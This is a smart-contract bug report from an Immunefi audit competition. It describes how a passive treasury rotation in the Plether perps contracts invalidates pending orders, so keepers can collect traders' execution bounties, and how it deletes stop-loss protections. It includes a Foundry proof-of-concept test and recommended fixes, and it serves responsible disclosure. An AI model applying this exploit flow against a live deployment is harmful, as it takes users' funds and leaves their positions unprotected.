# \#99973 [SC-Low] Passive protocol treasury activation alters execution config hash, leading to deterministic theft of trader bounties and permanent loss of position protection

**Submitted on Nov 15th 2026 at 23:33:15 UTC by @hunraj for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99973
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description



## Brief/Intro
In the post-audit `CfdTreasury` update, the Engine owner can schedule a successor protocol treasury that activates automatically based on `block.timestamp`. However, the active treasury address is hashed into `OrderLifecycleBook.currentExecutionConfigHash()`. When the clock strikes the activation timestamp, the global execution configuration hash changes passively (without a transaction). Any pending orders in the router queue immediately become invalid and impossible to execute. Malicious keepers can intentionally delay execution of orders committed shortly before the deadline, wait for the hash to flip, and clear the queue to steal the users' execution bounties. Furthermore, users attempting to exit via `cancelPositionProtectionAndCommitClose` will have their TP/SL protections permanently deleted while their leveraged positions remain open.


## Vulnerability Details
The vulnerability stems from the collision of a passive, time-based state transition with strict, cryptographic intent-pinning.


**1. The Passive State Transition:**
In `CfdTreasury.sol`, the protocol owner can schedule a new treasury using `proposeProtocolTreasury()`. The activation of this new treasury does not require a finalization transaction. It flips passively based on the block timestamp:
```solidity
function _activeTreasury() internal view returns (TreasuryConfig storage active) {
   active = _currentTreasury;
   // @audit SILENT STATE TRANSITION: Changes passively at block.timestamp
   if (_pendingTreasury.account != address(0) && block.timestamp >= _currentTreasury.lockedUntil) {
       active = _pendingTreasury;
   }
}
```


**2. The Strict Config Hash Requirement:**
In `OrderLifecycleBook.sol`, `currentExecutionConfigHash()` includes `engine.protocolTreasury()` in its payload.
When traders submit a V3 order, `OrderLiquidationBatchLogic._validateFreshRequest` strictly enforces that the user signs the exact, current configuration hash:
```solidity
bytes32 currentConfigHash = host.lifecycleBook().currentExecutionConfigHash();
if (bounds.expectedConfigHash == bytes32(0) || bounds.expectedConfigHash != currentConfigHash) {
   revert OrderRouter__ExecutionConfigMismatch(bounds.expectedConfigHash, currentConfigHash);
}
```
If a user submits an order 10 seconds before the treasury lock expires, they *must* sign the hash containing the old treasury.


**3. The Trap (MEV Shield + Un-cancellable Orders):**
Plether Perps uses a delayed-execution model. To prevent MEV, an order cannot be executed in the same block/second it is committed. It requires a Pyth tick published strictly *after* `commitTime`. Furthermore, users **cannot cancel pending orders**.


If a user submits an order at `T - 10` seconds, a malicious keeper can simply wait 10 seconds. At `T`, `protocolTreasury()` passively flips to the new address. The global `currentExecutionConfigHash()` changes. The user's order is now trapped and impossible to execute.


**4. The Theft:**
When the keeper processes the order at `T`, the execution fails due to the mismatched hash. The order is terminally finalized with `TerminalReason.ConfigMismatch`.
In `OrderLifecycleBook._validateBountyDisposition`, the protocol explicitly routes `ConfigMismatch` failures to `BountyDisposition.Paid`:
```solidity
} else if (receipt.reason == OrderV3Types.TerminalReason.Expired || reason == OrderV3Types.TerminalReason.ConfigMismatch) {
   // ... validation passes
}
// Further down in _validateBountyDisposition:
paid = bounty;
recipient = receipt.executor; // @audit Keeper gets paid!
disposition = OrderV3Types.BountyDisposition.Paid;
```
The keeper walks away with the user's reserved execution bounty for an order that the protocol itself made impossible to execute.


## Impact Details
There are two distinct and severe impacts:


**1. Direct Theft of User Funds (Bounties):**
While close orders have a zero bounty, **open and increase orders reserve a positively funded execution bounty** (up to $0.20 USDG per order). A malicious keeper can monitor the mempool for open orders submitted in the 60 seconds prior to a scheduled treasury rotation, refuse to execute them normally, wait for the hash to flip, and then call `router.clearInvalidOrders()`. Because `clearInvalidOrders` does not require a Pyth oracle update (zero oracle cost) and processes up to 64 orders in a single transaction, the keeper can farm pure MEV profit by stealing execution bounties from trapped users.


**2. Permanent Loss of Position Protection (Denial of Service):**
If a user has an active TP/SL protection and wants to exit manually before the treasury rotation, they must call `cancelPositionProtectionAndCommitClose()`.
This function deletes the active protection *first*, then queues the close order. When the treasury hash flips and the close order terminally fails with `ConfigMismatch`, the close order is discarded, but **the protection is not restored**. The user is left with a highly leveraged, unclosed position completely devoid of stop-loss protection, potentially leading to liquidation.


***
> this might look like "User Error" (arguing users shouldn't submit orders near the rotation deadline). However, the protocol explicitly forbids users from canceling orders, meaning a user who submits an order completely legally at `T - 55 seconds` is at the absolute mercy of keepers. Keepers control execution timing. They are financially incentivized to intentionally delay execution until `T` to farm the `ConfigMismatch` bounty via `clearInvalidOrders` (which costs them zero Pyth fees). The user is taken hostage by the protocol's architecture. Furthermore, the Engine owner scheduling a treasury rotation is a fully trusted, documented action (`README.md`); the bug is strictly the result of the passive state transition conflicting with the strict cryptographic intent pinning.
***


## Recommendation
1. **Remove `protocolTreasury()` from the `currentExecutionConfigHash()`:** The protocol treasury only dictates the internal clearinghouse account that receives protocol fee credits. It has absolutely zero impact on execution prices, margin requirements, trader fees, or PnL. There is no security benefit to forcing traders to pin this address, and removing it solves the issue entirely.
2. **Alternative:** If the hash must remain, alter `OrderRouter._settleTerminalBounty()` and `OrderLifecycleBook._validateBountyDisposition()` to map `TerminalReason.ConfigMismatch` to `BountyDisposition.RefundedToAccount` instead of `Paid`, so keepers cannot steal user funds for protocol-induced failures.


## References
* `CfdTreasury.sol`: `_activeTreasury()` passive transition.
* `OrderLifecycleBook.sol`: `currentExecutionConfigHash()` encoding.
* `OrderLiquidationBatchLogic.sol`: `_validateFreshRequest` strict hash enforcement.


## Proof of Concept

## Proof of Concept
The following Foundry test proves the exact flow: the owner schedules a treasury, a user submits a valid order, the clock crosses the activation threshold causing the config hash to flip passively, and a permissionless keeper clears the invalid order to steal the user's execution bounty.


Create a new file at `test/perps/spec/lp/ScheduledTreasuryExploit.t.sol`: Run
   `cd packages/perps`
   `forge test --match-test test_PoC_ScheduledTreasuryBricksPendingOrdersAndPaysKeeper -vvv`


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;


import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";


contract ScheduledTreasuryConfigMismatchTest is BasePerpTest {
   address trader = address(0x1111);
   address keeper = address(0x2222);
   address treasuryA = address(0xAAAA);
   address treasuryB = address(0xBBBB);


   function test_PoC_ScheduledTreasuryBricksPendingOrdersAndPaysKeeper() public {
       // 1. Setup: Engine owner locks treasuryA and schedules treasuryB
       vm.startPrank(engine.owner());
       engine.setProtocolTreasury(treasuryA, 30 days);
       engine.proposeProtocolTreasury(treasuryB, 30 days);
       vm.stopPrank();


       uint256 activationTime = engine.protocolTreasuryLockedUntil();


       // 2. Warp to 10 seconds before the new treasury activates
       vm.warp(activationTime - 10);


       // Trader funds account and prepares a perfectly valid open order
       _fundTrader(trader, 5000e6);
      
       OrderV3Types.OrderRequest memory request;
       request.clientOrderId = keccak256("poc_stolen_bounty");
       request.side = CfdTypes.Side.LONG;
       request.sizeDelta = 100_000e18; // 100k notional
       request.marginDelta = 1000e6;   // $1k margin
       request.targetPrice = 1e8;
       request.isClose = false;
       request.bounds.submitBy = uint64(block.timestamp + 60);
       request.bounds.executionWindowSeconds = 60; // 60 second window
       request.bounds.allowedExecutionModes = 7; // ALL_V3_EXECUTION_MODES
       request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
      
       // Use maximum bounds to ensure admission
       request.bounds.maxExecutionBountyAssets = type(uint256).max;
       request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
       request.bounds.maxActionChargeAssets = type(uint256).max;
       request.bounds.maxExplicitFeesAssets = type(uint256).max;
       request.bounds.maxPostPositionSize = type(uint256).max;
       request.bounds.maxPostLeverageBps = type(uint32).max;


       // Trader commits the order
       vm.prank(trader);
       uint64 orderId = router.commitOrder(request);


       // Verify the execution bounty was reserved from the trader's account
       uint256 reservedBounty = router.lifecycleBook().pendingIntent(orderId).executionBountyAssets;
       assertGt(reservedBounty, 0, "Bounty should be reserved");


       uint256 keeperBalanceBefore = clearinghouse.balanceAssets(keeper);


       // 3. Warp to exact activation time. No transactions have occurred!
       vm.warp(activationTime);


       // The active execution config hash has now silently changed
       bytes32 newHash = router.lifecycleBook().currentExecutionConfigHash();
       assertTrue(newHash != request.bounds.expectedConfigHash, "Hash flipped purely based on block.timestamp");


       // 4. Keeper executes oracle-free cleanup on the 'invalid' order
       // The keeper pays 0 Pyth fees and minimal gas to farm this bounty
       uint64[] memory ids = new uint64[](1);
       ids[0] = orderId;


       vm.prank(keeper);
       router.clearInvalidOrders(ids);


       // 5. Verify the impact: Order is bricked and bounty is stolen by keeper
       OrderV3Types.LifecycleStatus status = router.lifecycleBook().lifecycleStatus(orderId);
       OrderV3Types.TerminalOutcome memory outcome = router.lifecycleBook().terminalOutcome(orderId);


       assertEq(uint8(status), uint8(OrderV3Types.LifecycleStatus.Failed), "Order should be Failed");
       assertEq(uint8(outcome.reason), uint8(OrderV3Types.TerminalReason.ConfigMismatch), "Reason should be ConfigMismatch");


       uint256 keeperBalanceAfter = clearinghouse.balanceAssets(keeper);
       assertEq(
           keeperBalanceAfter - keeperBalanceBefore,
           reservedBounty,
           "Keeper successfully stole the trader's execution bounty!"
       );
   }
}
```

